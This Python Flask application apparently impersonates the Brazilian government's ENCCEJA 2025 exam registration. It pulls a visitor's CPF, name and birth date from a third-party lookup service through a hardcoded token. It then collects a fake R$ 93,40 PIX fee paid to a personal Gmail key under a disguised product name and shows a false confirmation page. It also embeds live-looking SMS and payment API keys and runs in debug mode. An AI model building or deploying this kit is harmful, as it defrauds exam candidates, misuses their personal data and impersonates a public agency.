#!/usr/bin/env python3
"""
ENCCEJA 2025 - Aplicação Principal Corrigida para VPS
Versão sem dependências problemáticas + API CPF corrigida
"""

import os
import sys
import functools
import time
import re
import random
import string
import json
import logging
import urllib.parse
import base64
from datetime import datetime
from io import BytesIO
import secrets
import requests

# Configuração de encoding UTF-8
if sys.version_info[0] >= 3:
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort

app = Flask(__name__)

# In-memory store for payment status (in production, use Redis or database)
payment_status_store = {}

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.INFO)

# Configuração SMS
SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'SMSDEV')

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Envia SMS usando a API SMSDEV
    Retorna True se o SMS foi enviado com sucesso, False caso contrário
    """
    try:
        # Chave API SMSDEV
        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"

        # Formatar o número de telefone (remover caracteres não numéricos)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Verificar se está no formato correto com DDD
            # Parâmetros da API
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message,
                'short_url': '1'
            }

            # Fazer a requisição para a API
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params, timeout=10)

            app.logger.info(f"SMSDEV: SMS enviado para {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True
            else:
                app.logger.error(f"Erro na API SMSDEV: {response.text}")
                return False
        else:
            app.logger.error(f"Formato de número de telefone inválido: {phone_number}")
            return False

    except Exception as e:
        app.logger.error(f"Erro ao enviar SMS via SMSDEV: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    """Gera QR code com tratamento de erro"""
    try:
        import qrcode
        from qrcode import constants
        
        qr = qrcode.QRCode(
            version=1,
            error_correction=constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(pix_code)
        qr.make(fit=True)

        img = qr.make_image(fill_color="black", back_color="white")
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        return f"data:image/png;base64,{img_str}"
    except ImportError:
        app.logger.warning("QRCode library not available, returning base64 placeholder")
        return "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
    except Exception as e:
        app.logger.error(f"Erro ao gerar QR code: {e}")
        return ""

# === ROTAS PRINCIPAIS ===

@app.route('/')
@app.route('/index')
@check_referer
def index():
    """Página principal - redireciona para /inscricao"""
    return redirect(url_for('inscricao'))

@app.route('/inscricao')
@check_referer
def inscricao():
    """Página de inscrição inicial"""
    app.logger.info("Renderizando página de inscrição")
    try:
        return render_template('inscricao.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar inscricao.html: {e}")
        # Fallback HTML se template não existir
        return '''
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>ENCCEJA 2025 - Inscrição</title>
            <style>
                body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
                .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
                .form-group { margin: 15px 0; }
                input[type="text"] { width: 100%; padding: 10px; font-size: 16px; }
                button { background: #28a745; color: white; padding: 15px 30px; font-size: 16px; border: none; cursor: pointer; }
                .loading { display: none; color: #007bff; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>ENCCEJA 2025</h1>
                <p>Exame Nacional para Certificação de Competências de Jovens e Adultos</p>
            </div>
            
            <h2>Consultar CPF</h2>
            <form id="cpfForm" onsubmit="consultarCPF(event)">
                <div class="form-group">
                    <label>Digite seu CPF:</label>
                    <input type="text" id="cpfInput" placeholder="000.000.000-00" maxlength="14" required>
                </div>
                <button type="submit">Consultar CPF</button>
                <div class="loading" id="loading">Consultando dados...</div>
            </form>
            
            <div id="resultado"></div>
            
            <script>
            function formatarCPF(cpf) {
                return cpf.replace(/(\\d{3})(\\d{3})(\\d{3})(\\d{2})/, '$1.$2.$3-$4');
            }
            
            document.getElementById('cpfInput').oninput = function(e) {
                let value = e.target.value.replace(/\\D/g, '');
                e.target.value = formatarCPF(value);
            };
            
            function consultarCPF(event) {
                event.preventDefault();
                
                const cpfInput = document.getElementById('cpfInput');
                const loading = document.getElementById('loading');
                const resultado = document.getElementById('resultado');
                
                const cpf = cpfInput.value.replace(/\\D/g, '');
                
                if (cpf.length !== 11) {
                    alert('CPF deve ter 11 dígitos');
                    return;
                }
                
                loading.style.display = 'block';
                resultado.innerHTML = '';
                
                fetch('/consultar-cpf-inscricao?cpf=' + cpf)
                .then(response => response.json())
                .then(data => {
                    loading.style.display = 'none';
                    if (data.sucesso) {
                        window.location.href = '/encceja-info';
                    } else {
                        resultado.innerHTML = '<p style="color: red;">Erro: ' + data.error + '</p>';
                    }
                })
                .catch(error => {
                    loading.style.display = 'none';
                    resultado.innerHTML = '<p style="color: red;">Erro na consulta</p>';
                    console.error('Erro:', error);
                });
            }
            </script>
        </body>
        </html>
        '''

@app.route('/encceja-info')
@check_referer
def encceja_info():
    """Informações sobre o ENCCEJA"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando encceja-info")
    try:
        return render_template('encceja-info.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENCCEJA 2025 - Informações</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
                .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
                .info-box {{ background: #f8f9fa; padding: 20px; margin: 20px 0; border-left: 4px solid #0066cc; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; text-decoration: none; display: inline-block; margin: 10px 0; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>ENCCEJA 2025</h1>
            </div>
            
            <div class="info-box">
                <h3>Dados Encontrados:</h3>
                <p><strong>Nome:</strong> {user_data.get('nome', 'N/A')}</p>
                <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                <p><strong>Data Nascimento:</strong> {user_data.get('dataNascimento', 'N/A')}</p>
            </div>
            
            <div class="info-box">
                <h3>Sobre o ENCCEJA 2025</h3>
                <p>O Exame Nacional para Certificação de Competências de Jovens e Adultos (ENCCEJA) é realizado pelo Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira (INEP).</p>
                <p><strong>Taxa de Inscrição:</strong> R$ 93,40</p>
                <p><strong>Prazo:</strong> Conforme edital oficial</p>
            </div>
            
            <a href="/validar-dados" class="btn">Continuar Inscrição</a>
        </body>
        </html>
        '''

@app.route('/validar-dados')
@check_referer
def validar_dados():
    """Validação de dados pessoais"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando validar-dados")
    try:
        return render_template('validar-dados.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENCCEJA 2025 - Validar Dados</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
                .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
                .form-group {{ margin: 15px 0; }}
                input {{ width: 100%; padding: 10px; font-size: 16px; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Validar Dados Pessoais</h1>
            </div>
            
            <form method="POST" action="/salvar-validacao">
                <div class="form-group">
                    <label>Nome Completo:</label>
                    <input type="text" name="nome" value="{user_data.get('nome', '')}" readonly>
                </div>
                
                <div class="form-group">
                    <label>CPF:</label>
                    <input type="text" name="cpf" value="{user_data.get('cpf', '')}" readonly>
                </div>
                
                <div class="form-group">
                    <label>Data de Nascimento:</label>
                    <input type="text" name="data_nascimento" value="{user_data.get('dataNascimento', '')}" readonly>
                </div>
                
                <button type="submit" class="btn">Confirmar e Continuar</button>
            </form>
        </body>
        </html>
        '''

@app.route('/salvar-validacao', methods=['POST'])
@check_referer
def salvar_validacao():
    """Salvar validação e ir para endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Dados validados, redirecionando para endereco")
    return redirect(url_for('endereco'))

@app.route('/endereco')
@check_referer
def endereco():
    """Formulario de endereco"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando endereco")
    try:
        return render_template('endereco.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENCCEJA 2025 - Endereço</title>
            <meta charset="utf-8">
            <style>
                body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
                .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
                .form-group { margin: 15px 0; }
                input, select { width: 100%; padding: 10px; font-size: 16px; }
                .btn { background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Dados de Endereço</h1>
            </div>
            
            <form method="POST" action="/salvar-endereco">
                <div class="form-group">
                    <label>CEP:</label>
                    <input type="text" name="cep" placeholder="00000-000" required>
                </div>
                
                <div class="form-group">
                    <label>Cidade:</label>
                    <input type="text" name="cidade" placeholder="Sua cidade" required>
                </div>
                
                <div class="form-group">
                    <label>Estado (UF):</label>
                    <select name="uf" required>
                        <option value="">Selecione...</option>
                        <option value="SP">São Paulo</option>
                        <option value="RJ">Rio de Janeiro</option>
                        <option value="MG">Minas Gerais</option>
                        <option value="RS">Rio Grande do Sul</option>
                        <option value="PR">Paraná</option>
                        <option value="SC">Santa Catarina</option>
                    </select>
                </div>
                
                <button type="submit" class="btn">Continuar</button>
            </form>
        </body>
        </html>
        '''

@app.route('/salvar-endereco', methods=['POST'])
@check_referer
def salvar_endereco():
    """Salvar endereco na sessao"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    endereco_data = {
        'cep': request.form.get('cep', '01000-000'),
        'cidade': request.form.get('cidade', 'São Paulo'),
        'uf': request.form.get('uf', 'SP')
    }
    
    session['endereco_data'] = endereco_data
    app.logger.info(f"Endereço salvo: {endereco_data['cidade']}")
    
    return redirect(url_for('local_prova'))

@app.route('/local-prova')
@check_referer
def local_prova():
    """Selecao do local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando local-prova")
    try:
        return render_template('local-prova.html')
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENCCEJA 2025 - Local de Prova</title>
            <meta charset="utf-8">
            <style>
                body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }
                .header { background: #0066cc; color: white; padding: 20px; text-align: center; }
                .form-group { margin: 15px 0; }
                select { width: 100%; padding: 10px; font-size: 16px; }
                .btn { background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Selecionar Local de Prova</h1>
            </div>
            
            <form method="POST" action="/salvar-local">
                <div class="form-group">
                    <label>Escolha o local mais próximo:</label>
                    <select name="local" required>
                        <option value="">Selecione um local...</option>
                        <option value="escola1">Escola Municipal Prof. Antonio Silva</option>
                        <option value="escola2">Escola Estadual Dr. José Santos</option>
                        <option value="escola3">Centro Educacional Maria Oliveira</option>
                        <option value="escola4">EMEF Carlos Drummond</option>
                    </select>
                </div>
                
                <p><strong>Observação:</strong> O local final será confirmado no cartão de inscrição.</p>
                
                <button type="submit" class="btn">Continuar para Pagamento</button>
            </form>
        </body>
        </html>
        '''

@app.route('/salvar-local', methods=['POST'])
@check_referer
def salvar_local():
    """Salvar local de prova"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    local = request.form.get('local', 'escola1')
    session['local_prova'] = local
    app.logger.info(f"Local salvo: {local}")
    
    return redirect(url_for('pagamento'))

@app.route('/pagamento', methods=['GET', 'POST'])
@check_referer
def pagamento():
    """Página de pagamento PIX"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando pagina de pagamento")
    try:
        return render_template('pagamento.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENCCEJA 2025 - Pagamento</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
                .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
                .payment-box {{ background: #f8f9fa; padding: 20px; margin: 20px 0; border: 2px solid #28a745; }}
                .btn {{ background: #28a745; color: white; padding: 15px 30px; border: none; cursor: pointer; font-size: 16px; }}
                .loading {{ display: none; color: #007bff; }}
                .qr-result {{ margin: 20px 0; padding: 20px; background: #fff; border: 1px solid #ddd; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Pagamento da Inscrição</h1>
            </div>
            
            <div class="payment-box">
                <h3>Resumo da Inscrição</h3>
                <p><strong>Nome:</strong> {user_data.get('nome', 'N/A')}</p>
                <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                <p><strong>Valor:</strong> R$ 93,40</p>
                <p><strong>Descrição:</strong> Taxa de Inscrição ENCCEJA 2025</p>
            </div>
            
            <button onclick="gerarPix()" class="btn">Gerar Código PIX</button>
            <div class="loading" id="loading">Gerando código PIX...</div>
            
            <div id="qr-result"></div>
            
            <script>
            function gerarPix() {{
                const loading = document.getElementById('loading');
                const result = document.getElementById('qr-result');
                
                loading.style.display = 'block';
                result.innerHTML = '';
                
                fetch('/criar-pagamento-pix', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{}})
                }})
                .then(response => response.json())
                .then(data => {{
                    loading.style.display = 'none';
                    if (data.success) {{
                        result.innerHTML = 
                            '<div class="qr-result">' +
                            '<h4>Código PIX Gerado com Sucesso!</h4>' +
                            '<p><strong>Valor:</strong> R$ ' + data.amount.toFixed(2) + '</p>' +
                            '<p><strong>ID Transação:</strong> ' + data.transactionId + '</p>' +
                            '<textarea readonly style="width:100%; height:100px; font-size:12px;">' + data.pixCode + '</textarea>' +
                            '<br><br>' +
                            '<a href="/inscricao-sucesso" style="background:#28a745; color:white; padding:10px 20px; text-decoration:none;">Finalizar Inscrição</a>' +
                            '</div>';
                    }} else {{
                        result.innerHTML = '<div style="color:red;">Erro: ' + data.error + '</div>';
                    }}
                }})
                .catch(error => {{
                    loading.style.display = 'none';
                    result.innerHTML = '<div style="color:red;">Erro na geração do PIX</div>';
                    console.error('Erro:', error);
                }});
            }}
            </script>
        </body>
        </html>
        '''

@app.route('/inscricao-sucesso')
@check_referer
def inscricao_sucesso():
    """Pagina de sucesso"""
    if 'user_data' not in session:
        return redirect(url_for('inscricao'))
    
    app.logger.info("Renderizando inscricao-sucesso")
    try:
        return render_template('inscricao-sucesso.html', user_data=session['user_data'])
    except Exception as e:
        app.logger.error(f"Erro ao renderizar template: {e}")
        user_data = session['user_data']
        return f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>ENCCEJA 2025 - Inscrição Realizada</title>
            <meta charset="utf-8">
            <style>
                body {{ font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; }}
                .header {{ background: #28a745; color: white; padding: 20px; text-align: center; }}
                .success-box {{ background: #d4edda; padding: 20px; margin: 20px 0; border: 1px solid #c3e6cb; }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>✅ Inscrição Realizada com Sucesso!</h1>
            </div>
            
            <div class="success-box">
                <h3>Parabéns, {user_data.get('nome', 'Candidato')}!</h3>
                <p><strong>CPF:</strong> {user_data.get('cpf', 'N/A')}</p>
                <p><strong>Exame:</strong> ENCCEJA 2025</p>
                <p><strong>Status:</strong> Inscrição confirmada</p>
            </div>
            
            <p><strong>Próximos passos:</strong></p>
            <ul>
                <li>Aguarde o cartão de confirmação</li>
                <li>Verifique local e horário da prova</li>
                <li>Prepare-se para o exame</li>
            </ul>
            
            <p><em>Em caso de dúvidas, consulte o site oficial do INEP.</em></p>
        </body>
        </html>
        '''

# === APIS ===

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição) - URL CORRIGIDA"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API funcionando com URL corrigida
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        app.logger.info(f"Consultando API CPF: {url}")
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"Resposta da API CPF: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Salvar na sessão
                session['user_data'] = user_data
                
                app.logger.info(f"CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": f"Erro de conexão com a API: {response.status_code}", "sucesso": False}), 500
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF na API: {str(e)}")
        return jsonify({"error": f"Erro interno: {str(e)}", "sucesso": False}), 500

@app.route('/criar-pagamento-pix', methods=['POST'])
@check_referer
def criar_pagamento_pix():
    """Criar pagamento PIX usando WitePay ou fallback"""
    try:
        amount = 93.40
        app.logger.info(f"Iniciando pagamento PIX - R$ {amount}")
        
        user_data = session.get('user_data', {})
        
        if not user_data:
            return jsonify({'success': False, 'error': 'Dados do usuário não encontrados'}), 400
        
        # Tentar usar WitePay primeiro
        try:
            app.logger.info("Tentando usar WitePay API")
            
            # Dados para WitePay
            witepay_key = os.environ.get('WITEPAY_API_KEY', 'sk_3a164e1c15db06cc76116b861fb4b0c482ab857dbd53f43d')
            
            # Criar pedido WitePay
            order_data = {
                "productData": [{
                    "name": "Receita do Amor",
                    "value": int(amount * 100)  # Valor em centavos
                }],
                "clientData": {
                    "clientName": user_data.get('nome', 'Cliente ENCCEJA'),
                    "clientDocument": user_data.get('cpf', '00000000000'),
                    "clientEmail": 'gerarpagamentos@gmail.com',
                    "clientPhone": '11987790088'
                }
            }
            
            headers = {
                'x-api-key': witepay_key,
                'Content-Type': 'application/json'
            }
            
            # Criar pedido
            response = requests.post(
                'https://api.witepay.com.br/v1/order/create',
                headers=headers,
                json=order_data,
                timeout=10
            )
            
            if response.status_code == 200:
                order_result = response.json()
                order_id = order_result.get('orderId')
                
                if order_id:
                    # Criar cobrança PIX
                    charge_data = {"paymentMethod": "pix"}
                    
                    charge_response = requests.post(
                        f'https://api.witepay.com.br/v1/charge/create/{order_id}',
                        headers=headers,
                        json=charge_data,
                        timeout=10
                    )
                    
                    if charge_response.status_code == 200:
                        charge_result = charge_response.json()
                        pix_code = charge_result.get('pixCode') or charge_result.get('qr_code')
                        
                        if pix_code:
                            transaction_id = charge_result.get('chargeId', f"ENCCEJA{int(time.time())}")
                            
                            app.logger.info(f"WitePay PIX gerado com sucesso - ID: {transaction_id}")
                            
                            return jsonify({
                                'success': True,
                                'pixCode': pix_code,
                                'transactionId': transaction_id,
                                'amount': amount,
                                'method': 'witepay'
                            })
            
            app.logger.warning("WitePay não retornou código PIX válido, usando fallback")
            
        except Exception as e:
            app.logger.warning(f"Erro no WitePay, usando fallback: {e}")
        
        # Fallback: Gerar PIX com chave direta
        app.logger.info("Gerando PIX com chave fallback")
        transaction_id = f"ENCCEJA{int(time.time())}"
        
        pix_key = "gerarpagamentos@gmail.com"
        merchant_name = "Receita do Amor - ENCCEJA"
        merchant_city = "SAO PAULO"
        
        # Construir codigo PIX padrao Banco Central
        pix_code = f"00020126830014br.gov.bcb.pix2561{pix_key}52040000530398654{int(amount*100):02d}5925{merchant_name}6009{merchant_city}62{len(transaction_id):02d}{transaction_id}6304"
        
        # Calcular CRC16
        def calculate_crc16(data):
            crc = 0xFFFF
            for byte in data.encode('utf-8'):
                crc ^= byte << 8
                for _ in range(8):
                    if crc & 0x8000:
                        crc = (crc << 1) ^ 0x1021
                    else:
                        crc <<= 1
                    crc &= 0xFFFF
            return f"{crc:04X}"
        
        pix_base = pix_code[:-4]
        crc = calculate_crc16(pix_base + "6304")
        pix_code_final = pix_base + "6304" + crc
        
        app.logger.info(f"PIX fallback gerado com sucesso - ID: {transaction_id}")
        
        return jsonify({
            'success': True,
            'pixCode': pix_code_final,
            'transactionId': transaction_id,
            'amount': amount,
            'method': 'fallback'
        })
        
    except Exception as e:
        app.logger.error(f"Erro ao criar PIX: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# === ROTAS DE SISTEMA ===

@app.route('/status')
def status():
    """Status do sistema"""
    return jsonify({
        'status': 'online',
        'projeto': 'ENCCEJA 2025 Principal Corrigido',
        'api_cpf': 'https://consulta.fontesderenda.blog/cpf.php',
        'token': '1285fe4s-e931-4071-a848-3fac8273c55a',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():  
    """Health check"""
    return "OK - ENCCEJA 2025", 200

@app.route('/test-cpf/<cpf>')
def test_cpf(cpf):
    """Testar API CPF diretamente"""
    try:
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf}&token={token}"
        response = requests.get(url, timeout=10)
        return jsonify({
            'url': url,
            'status': response.status_code,
            'data': response.json() if response.status_code == 200 else response.text
        })
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    app.logger.info("=== ENCCEJA 2025 - APLICAÇÃO PRINCIPAL CORRIGIDA ===")
    app.logger.info("API CPF: https://consulta.fontesderenda.blog/cpf.php")
    app.logger.info("Token: 1285fe4s-e931-4071-a848-3fac8273c55a")
    app.logger.info("Templates: Com fallback HTML embutido")
    app.logger.info("WitePay: Com fallback para PIX direto")
    app.logger.info("Dependências: Mínimas e seguras")
    app.logger.info("Iniciando na porta 5000...")
    app.run(host='0.0.0.0', port=5000, debug=True)